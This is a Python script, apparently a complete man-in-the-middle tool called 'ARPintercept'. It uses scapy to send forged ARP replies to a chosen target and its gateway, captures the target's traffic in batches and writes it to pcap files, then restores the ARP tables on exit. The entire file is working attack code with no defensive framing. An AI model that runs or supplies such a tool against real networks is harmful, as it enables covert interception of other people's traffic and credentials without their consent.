#!/usr/env/python3

from scapy.all import *
import os
import sys
import threading
import signal
import getopt
import re
import time


DEFAULT_PACKETS_PER_MINUTE = 6
DEFAULT_PAKCKETS_TO_SNIFF = 1000

def usage():
    print("ARPintercept - Man in the Middle a device and gateway")
    print()
    print("Flags:")
    print("{} - target ip address".format("\t-t --target".ljust(20," ")))
    print("{} - number of ARP poisoning packets to send per minute".format("\t-p --packets".ljust(20," ")))
    print("{} - number of packets per pcap file".format("\t-r --receive".ljust(20," ")))
    print()


def main():
    
    # scapy config
    conf.verb = 0

    if len(sys.argv) > 1:
        try:
            opts,args = getopt.getopt(sys.argv[1:],"t:p:r:",["target","packets","receive"])
        except getopt.GetoptError as e:
            print(str(e))
            usage()
        target = ""
        packets_per_minute = DEFAULT_PACKETS_PER_MINUTE
        packets_to_sniff = DEFAULT_PAKCKETS_TO_SNIFF
        for o,a in opts:
            if o in ("-t","--target"):
                target = a
            elif o in ("-p","--packets"):
                packets_per_minute = int(a)
            elif o in ("-r","--receive"):
                packets_to_sniff = int(a)
            else:
                print("Invalid option {} with value {}".format(o,a))
                sys.exit(1)

        gateway_ip = get_gateway_ip()
        gateway_mac = get_mac(gateway_ip)
        target_mac = get_mac(target)
        #bpf_filter = "ip host {}".format(target)
        bpf_filter = "ip host {}".format(target)

        arp_thread = threading.Thread(target=poison_target, args=(gateway_ip,gateway_mac,target,target_mac,packets_per_minute))
        arp_thread.daemon = True
        arp_thread.start()

        print("[+] Starting sniffing [CTRL-C] to stop")
        file_counter = 0
        while True:
            try:
                packets = sniff(count=packets_to_sniff,filter=bpf_filter)
                filename = "{}_cap_{}.pcap".format(target, file_counter)
                file_counter += 1
                wrpcap(filename, packets)
                print("[+] Saved {} packets to {}".format(packets_to_sniff, filename))
            except KeyboardInterrupt:
                print("[+] Stopping attack")
                restore_target(gateway_ip,gateway_mac,target,target_mac)
                sys.exit(0)


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac, packets_per_minute):
    target = ARP()
    target.op = 2
    target.psrc = gateway_ip
    target.pdst = target_ip
    target.hwdst = target_mac

    gateway = ARP()
    gateway.op = 2
    gateway.psrc = target_ip
    gateway.pdst = gateway_ip
    gateway.hwdst = gateway_mac

    while True:
        print("[+] Sending posioned packets")

        send(target)
        send(gateway)
        time.sleep(60/packets_per_minute)


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    target = ARP()
    target.op = 2
    target.psrc = gateway_ip
    target.pdst = target_ip
    target.hwdst = "ff:ff:ff:ff:ff:ff"
    target.hwsrc = gateway_mac

    gateway = ARP()
    gateway.op = 2
    gateway.psrc = target_ip
    gateway.pdst = gateway_ip
    gateway.hwdst = "ff:ff:ff:ff:ff:ff"
    gateway.hwsrc = target_mac

    print("[+] Restoring target")

    send(target)
    send(gateway)

    os.kill(os.getpid(), signal.SIGINT)


def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    for s,r in responses:
        return r[Ether].src

    return None


def get_gateway_ip():
    try:
        print("[+] Looking for gateway ip")
        gateway = sr1(IP(dst="www.google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        print("[+] Found gateway ip at {}".format(gateway.src))
        return gateway.src
    except:
        print("[-] Could not get gateway IP, please enter IP manually")
        return input("<APRintercept:#> Gateway IP: ")


if __name__ == '__main__':
    main()